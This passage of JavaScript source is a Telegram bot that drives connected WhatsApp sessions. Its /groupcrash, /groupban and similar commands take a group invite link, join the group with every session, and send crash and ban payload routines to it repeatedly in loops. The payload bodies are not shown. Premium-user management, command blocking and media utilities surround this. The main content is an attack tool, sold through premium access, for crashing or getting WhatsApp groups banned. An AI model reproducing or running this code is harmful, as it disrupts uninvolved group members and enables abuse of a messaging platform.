</tg-button-row>`,
      msg.message_id
    );
  }

  const link = match[2].trim();
  const inviteCode = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)?.[1];
  if (!inviteCode) {
    return sendRichMenu(chatId,
      `<h3>invalid link</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>invalid group link</td></tr>
</table>`,
      msg.message_id
    );
  }

  const allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
    if (data.type === "public") return true;
    if (data.type === "private") return data.ownerId === userId;
    return false;
  });

  if (allSessions.length === 0) {
    return sendRichMenu(chatId,
      `<h3>no sender</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no bot connected</td></tr>
</table>`
    );
  }

  let groupInfo = null;
  let selectedBot = null;

  for (const [botNum, data] of allSessions) {
    const sock = data.sock;
    if (sock?.user) {
      try {
        groupInfo = await sock.groupGetInviteInfo(inviteCode);
        selectedBot = sock;
        break;
      } catch (e) {
        continue;
      }
    }
  }

  if (!groupInfo || !selectedBot) {
    return sendRichMenu(chatId,
      `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>cannot access group</td></tr>
</table>`
    );
  }

  const groupJid = groupInfo.id;
  const groupName = groupInfo.subject || "unknown";
  const announce = groupInfo.announce || false;

  if (announce) {
    return sendRichMenu(chatId,
      `<h3>cannot send</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>reason</td><td>group requires admin permission</td></tr>
</table>`
    );
  }

  let joined = false;
  try {
    await selectedBot.groupAcceptInvite(inviteCode);
    joined = true;
  } catch (e) {
    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      if (sock === selectedBot) continue;
      if (sock?.user) {
        try {
          await sock.groupAcceptInvite(inviteCode);
          joined = true;
          break;
        } catch (err) {}
      }
    }
  }

  if (!joined) {
    return sendRichMenu(chatId,
      `<h3>failed to join</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>reason</td><td>link expired / group full / blocked</td></tr>
</table>`
    );
  }

  await sendRichMenu(chatId,
    `<h3>group bug sent</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>group</td><td>${groupName}</td></tr>
<tr><td>type</td><td>/${commandName}</td></tr>
<tr><td>status</td><td>done</td></tr>
</table>

<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
  <tg-button type="url" url="${link}" style="primary">group link</tg-button>
</tg-button-row>`
  );

  (async () => {
    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      if (!sock?.user) continue;
      try {
        for (let i = 0; i < 20; i++) {
          await Promise.allSettled([
            kitow(sock, groupJid).catch(() => {}),
            kicaumania(sock, groupJid).catch(() => {}),
            halonyetGB(sock, groupJid).catch(() => {})
          ]);
          const currentDelay = getCurrentDelay();
          if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
        }
      } catch (err) {
        console.error(`bot ${botNum} error:`, err);
      }
    }
  })();
});

bot.onText(/^\/(groupcrash)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  if (!match[2]) {
    return sendRichMenu(chatId,
      `<h3>missing group link</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${commandName}</td></tr>
<tr><td>example</td><td>/${commandName} https://chat.whatsapp.com/abcd1234</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const link = match[2].trim();
  const inviteCode = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)?.[1];
  if (!inviteCode) {
    return sendRichMenu(chatId,
      `<h3>invalid link</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>invalid group link</td></tr>
</table>`,
      msg.message_id
    );
  }

  const allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
    if (data.type === "public") return true;
    if (data.type === "private") return data.ownerId === userId;
    return false;
  });

  if (allSessions.length === 0) {
    return sendRichMenu(chatId,
      `<h3>no sender</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no bot connected</td></tr>
</table>`
    );
  }

  let groupInfo = null;
  let selectedBot = null;

  for (const [botNum, data] of allSessions) {
    const sock = data.sock;
    if (sock?.user) {
      try {
        groupInfo = await sock.groupGetInviteInfo(inviteCode);
        selectedBot = sock;
        break;
      } catch (e) {
        continue;
      }
    }
  }

  if (!groupInfo || !selectedBot) {
    return sendRichMenu(chatId,
      `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>cannot access group</td></tr>
</table>`
    );
  }

  const groupJid = groupInfo.id;
  const groupName = groupInfo.subject || "unknown";
  const announce = groupInfo.announce || false;

  if (announce) {
    return sendRichMenu(chatId,
      `<h3>cannot send</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>reason</td><td>group requires admin permission</td></tr>
</table>`
    );
  }

  let joined = false;
  try {
    await selectedBot.groupAcceptInvite(inviteCode);
    joined = true;
  } catch (e) {
    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      if (sock === selectedBot) continue;
      if (sock?.user) {
        try {
          await sock.groupAcceptInvite(inviteCode);
          joined = true;
          break;
        } catch (err) {}
      }
    }
  }

  if (!joined) {
    return sendRichMenu(chatId,
      `<h3>failed to join</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>reason</td><td>link expired / group full / blocked</td></tr>
</table>`
    );
  }

  await sendRichMenu(chatId,
    `<h3>group bug sent</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>group</td><td>${groupName}</td></tr>
<tr><td>type</td><td>/${commandName}</td></tr>
<tr><td>status</td><td>done</td></tr>
</table>

<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
  <tg-button type="url" url="${link}" style="primary">group link</tg-button>
</tg-button-row>`
  );

  (async () => {
    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      if (!sock?.user) continue;
      try {
        for (let i = 0; i < 20; i++) {
          await Promise.allSettled([
            kitow(sock, groupJid).catch(() => {}),
            kicaumania(sock, groupJid).catch(() => {}),
            GbCrash(sock, groupJid).catch(() => {})
          ]);
          const currentDelay = getCurrentDelay();
          if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
        }
      } catch (err) {
        console.error(`bot ${botNum} error:`, err);
      }
    }
  })();
});

bot.onText(/^\/(groupban)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  if (!match[2]) {
    return sendRichMenu(chatId,
      `<h3>missing group link</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${commandName}</td></tr>
<tr><td>example</td><td>/${commandName} https://chat.whatsapp.com/abcd1234</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const link = match[2].trim();
  const inviteCode = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)?.[1];
  if (!inviteCode) {
    return sendRichMenu(chatId,
      `<h3>invalid link</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>invalid group link</td></tr>
</table>`,
      msg.message_id
    );
  }

  const allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
    if (data.type === "public") return true;
    if (data.type === "private") return data.ownerId === userId;
    return false;
  });

  if (allSessions.length === 0) {
    return sendRichMenu(chatId,
      `<h3>no sender</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no bot connected</td></tr>
</table>`
    );
  }

  let groupInfo = null;
  let selectedBot = null;

  for (const [botNum, data] of allSessions) {
    const sock = data.sock;
    if (sock?.user) {
      try {
        groupInfo = await sock.groupGetInviteInfo(inviteCode);
        selectedBot = sock;
        break;
      } catch (e) {
        continue;
      }
    }
  }

  if (!groupInfo || !selectedBot) {
    return sendRichMenu(chatId,
      `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>cannot access group</td></tr>
</table>`
    );
  }

  const groupJid = groupInfo.id;
  const groupName = groupInfo.subject || "unknown";
  const announce = groupInfo.announce || false;

  if (announce) {
    return sendRichMenu(chatId,
      `<h3>cannot send</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>reason</td><td>group requires admin permission</td></tr>
</table>`
    );
  }

  let joined = false;
  try {
    await selectedBot.groupAcceptInvite(inviteCode);
    joined = true;
  } catch (e) {
    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      if (sock === selectedBot) continue;
      if (sock?.user) {
        try {
          await sock.groupAcceptInvite(inviteCode);
          joined = true;
          break;
        } catch (err) {}
      }
    }
  }

  if (!joined) {
    return sendRichMenu(chatId,
      `<h3>failed to join</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>reason</td><td>link expired / group full / blocked</td></tr>
</table>`
    );
  }

  await sendRichMenu(chatId,
    `<h3>group ban sent</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>group</td><td>${groupName}</td></tr>
<tr><td>type</td><td>/${commandName}</td></tr>
<tr><td>status</td><td>done</td></tr>
</table>

<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
  <tg-button type="url" url="${link}" style="primary">group link</tg-button>
</tg-button-row>`
  );

  (async () => {
    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      if (!sock?.user) continue;
      try {
        for (let i = 0; i < 5; i++) {
          await Promise.allSettled([
            bansgc(sock, groupJid).catch(() => {})
          ]);
          const currentDelay = getCurrentDelay();
          if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
        }
      } catch (err) {
        console.error(`bot ${botNum} error:`, err);
      }
    }
  })();
});

bot.onText(/^\/blockcmd(?:\s+(on|off))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return restricted(chatId);
  }

  const arg = (match[1] || "").toLowerCase();

  if (arg === "on") {
    blockCmdEnabled = true;
    saveBlockCmd();
    return sendRichMenu(chatId,
      `<h3>blockcmd enabled</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>enabled</td></tr>
<tr><td>effect</td><td>only owner / premium / admin can use</td></tr>
<tr><td>anti kidnap</td><td>active</td></tr>
</table>`
    );
  }

  if (arg === "off") {
    blockCmdEnabled = false;
    saveBlockCmd();
    return sendRichMenu(chatId,
      `<h3>blockcmd disabled</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>disabled</td></tr>
<tr><td>effect</td><td>all users can use the bot</td></tr>
</table>`
    );
  }

  const status = blockCmdEnabled ? "on" : "off";
  await sendRichMenu(chatId,
    `<h3>blockcmd status</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>current</td><td>${status}</td></tr>
<tr><td>on</td><td>lock bot + anti kidnap</td></tr>
<tr><td>off</td><td>open access for public</td></tr>
</table>

<p>use <code>/block /command</code> to block specific commands</p>`
  );
});

bot.onText(/^\/block(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return restricted(chatId);

  if (!match[1]) {
    return sendRichMenu(chatId,
      `<h3>missing command</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>usage</td><td>/block &lt;command&gt;</td></tr>
<tr><td>example</td><td>/block /start</td></tr>
<tr><td>example</td><td>/block /menu</td></tr>
</table>`,
      msg.message_id
    );
  }

  let cmd = match[1].trim().toLowerCase();
  if (!cmd.startsWith("/")) cmd = "/" + cmd;
  cmd = extractCommand(cmd) || cmd;

  if (PROTECTED_COMMANDS.includes(cmd)) {
    return sendRichMenu(chatId,
      `<h3>cannot block</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>${cmd}</td></tr>
<tr><td>reason</td><td>protected command (owner tools)</td></tr>
</table>`,
      msg.message_id
    );
  }

  if (blockedCommands.includes(cmd)) {
    return sendRichMenu(chatId,
      `<h3>already blocked</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>${cmd}</td></tr>
<tr><td>status</td><td>already in blocklist</td></tr>
</table>`,
      msg.message_id
    );
  }

  blockedCommands.push(cmd);
  saveBlockedCommands();

  await sendRichMenu(chatId,
    `<h3>command blocked</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>${cmd}</td></tr>
<tr><td>status</td><td>successfully blocked</td></tr>
<tr><td>note</td><td>owner / premium / admin can still use</td></tr>
</table>`,
    msg.message_id
  );
});

bot.onText(/^\/unblock(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return restricted(chatId);

  if (!match[1]) {
    return sendRichMenu(chatId,
      `<h3>missing command</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>usage</td><td>/unblock &lt;command&gt;</td></tr>
<tr><td>example</td><td>/unblock /start</td></tr>
</table>`,
      msg.message_id
    );
  }

  let cmd = match[1].trim().toLowerCase();
  if (!cmd.startsWith("/")) cmd = "/" + cmd;
  cmd = extractCommand(cmd) || cmd;

  if (!blockedCommands.includes(cmd)) {
    return sendRichMenu(chatId,
      `<h3>not blocked</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>${cmd}</td></tr>
<tr><td>status</td><td>not in blocklist</td></tr>
</table>`,
      msg.message_id
    );
  }

  blockedCommands = blockedCommands.filter(c => c !== cmd);
  saveBlockedCommands();

  await sendRichMenu(chatId,
    `<h3>command unblocked</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>${cmd}</td></tr>
<tr><td>status</td><td>successfully unblocked</td></tr>
</table>`,
    msg.message_id
  );
});

bot.onText(/^\/listblock$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return restricted(chatId);

  if (blockedCommands.length === 0) {
    return sendRichMenu(chatId,
      `<h3>blocked commands</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no blocked commands</td></tr>
</table>`
    );
  }

  let rowsHtml = "";
  blockedCommands.forEach((cmd, i) => {
    rowsHtml += `<tr><td>${i + 1}</td><td>${cmd}</td></tr>\n`;
  });

  await sendRichMenu(chatId,
    `<h3>blocked commands</h3>
<table border="2">
<tr><th>#</th><th>command</th></tr>
${rowsHtml}
</table>

<p>total: ${blockedCommands.length} commands</p>`
  );
});

bot.onText(/^\/modemurbuggb(?:\s+(on|off))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const arg = match[1];

  try {
    if (msg.chat.type === "private") {
      return sendRichMenu(chatId,
        `<h3>group only</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>this command is for groups only</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`
      );
    }

    const chatMember = await bot.getChatMember(chatId, userId);
    const isAdmin = chatMember.status === 'creator' || chatMember.status === 'administrator';
    const isPremium = premiumUsers.includes(userId);

    if (!isOwner(userId) && !(isPremium && isAdmin)) {
      return sendRichMenu(chatId,
        `<h3>access denied</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>only owner or premium admins</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`
      );
    }

    const idgc = String(chatId);
    const isActive = murbugGC.includes(idgc);

    if (arg === 'on') {
      if (isActive) {
        return sendRichMenu(chatId,
          `<h3>already active</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>this group is already active in murbug mode</td></tr>
</table>`
        );
      }
      murbugGC.push(idgc);
      saveMurbugGC();
      return sendRichMenu(chatId,
        `<h3>murbug added</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>successfully added to murbug whitelist</td></tr>
</table>`
      );
    }

    if (arg === 'off') {
      if (!isActive) {
        return sendRichMenu(chatId,
          `<h3>not active</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>not active in murbug mode</td></tr>
</table>`
        );
      }
      murbugGC = murbugGC.filter(g => g !== idgc);
      saveMurbugGC();
      return sendRichMenu(chatId,
        `<h3>murbug removed</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>removed from murbug whitelist</td></tr>
</table>`
      );
    }

    const statusText = isActive ? "online" : "offline";
    await sendRichMenu(chatId,
      `<h3>murbug status</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>${statusText}</td></tr>
<tr><td>on</td><td>/modemurbuggb on</td></tr>
<tr><td>off</td><td>/modemurbuggb off</td></tr>
</table>`
    );

  } catch (error) {
    console.error("error /modemurbuggb:", error);
    sendRichMenu(chatId,
      `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>${error.message}</td></tr>
</table>`
    );
  }
});

bot.onText(/^\/addprem(?:\s(.+))?$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(msg.from.id) && !adminUsers.includes(senderId)) {
        return restricted(chatId);
    }

    if (!match[1]) {
        return sendRichMenu(chatId,
            `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/addprem</td></tr>
<tr><td>example</td><td>/addprem 123456789</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
            msg.message_id
        );
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return sendRichMenu(chatId,
            `<h3>invalid input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>example</td><td>/addprem 6843967527</td></tr>
</table>`,
            msg.message_id
        );
    }

    if (!premiumUsers.includes(userId)) {
        premiumUsers.push(userId);
        savePremiumUsers();
        console.log(`${senderId} added ${userId} to premium`);
        sendRichMenu(chatId,
            `<h3>premium added</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>user id</td><td>${userId}</td></tr>
<tr><td>status</td><td>added to premium list</td></tr>
</table>`
        );
    } else {
        sendRichMenu(chatId,
            `<h3>already premium</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>user id</td><td>${userId}</td></tr>
<tr><td>status</td><td>already in premium list</td></tr>
</table>`
        );
    }
});

bot.onText(/^\/addowner(?:\s(.+))?$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId)) {
        return restricted(chatId);
    }

    if (!match[1]) {
        return sendRichMenu(chatId,
            `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/addowner</td></tr>
<tr><td>example</td><td>/addowner 123456789</td></tr>
</table>`,
            msg.message_id
        );
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return sendRichMenu(chatId,
            `<h3>invalid input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>example</td><td>/addowner 6843967527</td></tr>
</table>`,
            msg.message_id
        );
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} added ${userId} to admin`);
        sendRichMenu(chatId,
            `<h3>admin added</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>user id</td><td>${userId}</td></tr>
<tr><td>status</td><td>added as admin</td></tr>
</table>`
        );
    } else {
        sendRichMenu(chatId,
            `<h3>already admin</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>user id</td><td>${userId}</td></tr>
<tr><td>status</td><td>already an admin</td></tr>
</table>`
        );
    }
});

bot.onText(/^\/delprem(?:\s(.+))?$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(msg.from.id) && !adminUsers.includes(senderId)) {
        return restricted(chatId);
    }

    if (!match[1]) {
        return sendRichMenu(chatId,
            `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/delprem</td></tr>
<tr><td>example</td><td>/delprem 123456789</td></tr>
</table>`,
            msg.message_id
        );
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (premiumUsers.includes(userId)) {
        premiumUsers = premiumUsers.filter(id => id !== userId);
        savePremiumUsers();
        console.log(`${senderId} deleted ${userId} from premium`);
        sendRichMenu(chatId,
            `<h3>premium removed</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>user id</td><td>${userId}</td></tr>
<tr><td>status</td><td>removed from premium list</td></tr>
</table>`
        );
    } else {
        sendRichMenu(chatId,
            `<h3>not premium</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>user id</td><td>${userId}</td></tr>
<tr><td>status</td><td>not in premium list</td></tr>
</table>`
        );
    }
});

bot.onText(/^\/delowner(?:\s(.+))?$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(msg.from.id) && !adminUsers.includes(senderId)) {
        return restricted(chatId);
    }

    if (!match[1]) {
        return sendRichMenu(chatId,
            `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/delowner</td></tr>
<tr><td>example</td><td>/delowner 123456789</td></tr>
</table>`,
            msg.message_id
        );
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (adminUsers.includes(userId)) {
        adminUsers = adminUsers.filter(id => id !== userId);
        saveAdminUsers();
        console.log(`${senderId} deleted ${userId} from admin`);
        sendRichMenu(chatId,
            `<h3>admin removed</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>user id</td><td>${userId}</td></tr>
<tr><td>status</td><td>removed from admin list</td></tr>
</table>`
        );
    } else {
        sendRichMenu(chatId,
            `<h3>not admin</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>user id</td><td>${userId}</td></tr>
<tr><td>status</td><td>not in admin list</td></tr>
</table>`
        );
    }
});

bot.onText(/^\/listprem$/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(msg.from.id) && !adminUsers.includes(senderId)) {
        return restricted(chatId);
    }

    let rowsHtml = "";
    if (premiumUsers.length === 0) {
        rowsHtml = `<tr><td>-</td><td>no premium users</td></tr>`;
    } else {
        premiumUsers.forEach((id, i) => {
            rowsHtml += `<tr><td>${i + 1}</td><td>${id}</td></tr>\n`;
        });
    }

    sendRichMenu(chatId,
        `<h3>premium user list</h3>
<table border="2">
<tr><th>#</th><th>user id</th></tr>
${rowsHtml}
</table>`
    );
});

bot.onText(/^\/listowner$/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(msg.from.id) && !adminUsers.includes(senderId)) {
        return restricted(chatId);
    }

    let rowsHtml = "";
    if (adminUsers.length === 0) {
        rowsHtml = `<tr><td>-</td><td>no admins</td></tr>`;
    } else {
        adminUsers.forEach((id, i) => {
            rowsHtml += `<tr><td>${i + 1}</td><td>${id}</td></tr>\n`;
        });
    }

    sendRichMenu(chatId,
        `<h3>admin list</h3>
<table border="2">
<tr><th>#</th><th>user id</th></tr>
${rowsHtml}
</table>`
    );
});

bot.onText(/^\/info(?:\s|$)/i, async (msg) => {
  const target = (msg.reply_to_message && msg.reply_to_message.from)
    ? msg.reply_to_message.from
    : msg.from;

  const fullName = [target.first_name, target.last_name].filter(Boolean).join(" ") || "tanpa nama";
  const usernameText = target.username ? `@${target.username}` : "none";
  const profileUrl = target.username
    ? `https://t.me/${target.username}`
    : `tg://openmessage?user_id=${target.id}`;

  let roleText = "user";
  try {
    const idStr = String(target.id);
    if (isOwner(idStr)) roleText = "owner";
    else if (adminUsers.map(String).includes(idStr)) roleText = "admin";
    else if (premiumUsers.map(String).includes(idStr)) roleText = "premium";
  } catch (e) {}

  const isReply = !!(msg.reply_to_message && msg.reply_to_message.from);

  await sendRichMenu(
    msg.chat.id,
    `<h3>user info${isReply ? " (reply)" : ""}</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>name</td><td>${escapeHtml(fullName)}</td></tr>
<tr><td>username</td><td>${escapeHtml(usernameText)}</td></tr>
<tr><td>id</td><td><code>${target.id}</code></td></tr>
<tr><td>role</td><td>${roleText}</td></tr>
</table>

<tg-button-row>
  <tg-button type="url" url="${profileUrl}" style="primary">telegram profile</tg-button>
</tg-button-row>`,
    msg.message_id
  );
});

bot.onText(/^\/(listsender|listsenderpublic|listsenderprivat|devices)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderid = msg.from.id;
  const command = match[1];

  if (!adminUsers.includes(senderid) && !isOwner(senderid)) {
    return restricted(msg.from.id);
  }

  try {
    let filterType = "all";
    if (command === "listsenderpublic") filterType = "public";
    if (command === "listsenderprivat") filterType = "private";

    const filteredSessions = Array.from(sessions.entries()).filter(([_, data]) => {
      if (filterType === "all") return true;
      return data.type === filterType;
    });

    if (filteredSessions.length === 0) {
      return sendRichMenu(chatId,
        `<h3>sender list</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>filter</td><td>${filterType}</td></tr>
<tr><td>status</td><td>no senders connected</td></tr>
</table>`
      );
    }

    let rowsHtml = "";
    let index = 1;
    for (const [botNumber, data] of filteredSessions) {
      const sock = data.sock;
      const type = data.type ? data.type : "public";
      const status = sock?.user ? "connected" : "not connected";
      const owner = data.ownerId ? `${data.ownerId}` : "unknown";
      rowsHtml += `<tr><td>${index}</td><td>${botNumber}</td><td>${type}</td><td>${status}</td><td>${owner}</td></tr>\n`;
      index++;
    }

    await sendRichMenu(chatId,
      `<h3>sender list (${filterType})</h3>
<table border="2">
<tr><th>#</th><th>bot</th><th>type</th><th>status</th><th>owner</th></tr>
${rowsHtml}
</table>

<p>total: ${filteredSessions.length} senders</p>`
    );
  } catch (error) {
    console.error("error in listbot:", error);
    await sendRichMenu(chatId,
      `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>${error.message}</td></tr>
</table>`
    );
  }
});

bot.onText(/^\/brat(?:\s+(.+))?$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match?.[1];

    if (!text) {
        return sendRichMenu(chatId,
            `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/brat</td></tr>
<tr><td>example</td><td>/brat hello man</td></tr>
</table>`,
            msg.message_id
        );
    }

    const loading = await bot.sendMessage(chatId, `<blockquote>creating brat sticker...</blockquote>`, {
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id
    });

    try {
        const url = `https://api-mininxd.vercel.app/brat?txt=${encodeURIComponent(text)}`;
        const res = await axios.get(url, { responseType: "arraybuffer" });
        const buffer = Buffer.from(res.data);

        await bot.sendSticker(chatId, buffer, {
            reply_to_message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "creator", url: "https://t.me/heysaka", style: "primary", icon_custom_emoji_id: "5319301933645707826" }]
                ]
            }
        });

        await bot.deleteMessage(chatId, loading.message_id);
    } catch (err) {
        console.error("brat error:", err.response?.status, err.message);
        try { await bot.deleteMessage(chatId, loading.message_id); } catch {}
        sendRichMenu(chatId,
            `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>failed to create brat sticker</td></tr>
</table>`,
            msg.message_id
        );
    }
});

bot.onText(/^\/tourl$/, async (msg) => {
    const chatId = msg.chat.id;
    const reply = msg.reply_to_message;

    if (!reply || (!reply.photo && !reply.video && !reply.document)) {
        return sendRichMenu(chatId,
            `<h3>missing media</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>usage</td><td>reply to a photo, video or file</td></tr>
<tr><td>then send</td><td>/tourl</td></tr>
</table>`,
            msg.message_id
        );
    }

    try {
        const processingMsg = await bot.sendMessage(chatId, `<blockquote>uploading file...</blockquote>`, {
            parse_mode: "HTML",
            reply_to_message_id: msg.message_id
        });

        const fileId = reply.photo
            ? reply.photo[reply.photo.length - 1].file_id
            : (reply.video?.file_id || reply.document?.file_id);

        const file = await bot.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`;
        const responseFile = await axios.get(fileUrl, { responseType: "arraybuffer" });
        const buffer = Buffer.from(responseFile.data);
        const fileName = file.file_path.split("/").pop() || "file";

        const form = new FormData();
        form.append("files[]", buffer, fileName);

        const { data } = await axios.post("https://uguu.se/upload.php", form, { headers: form.getHeaders() });
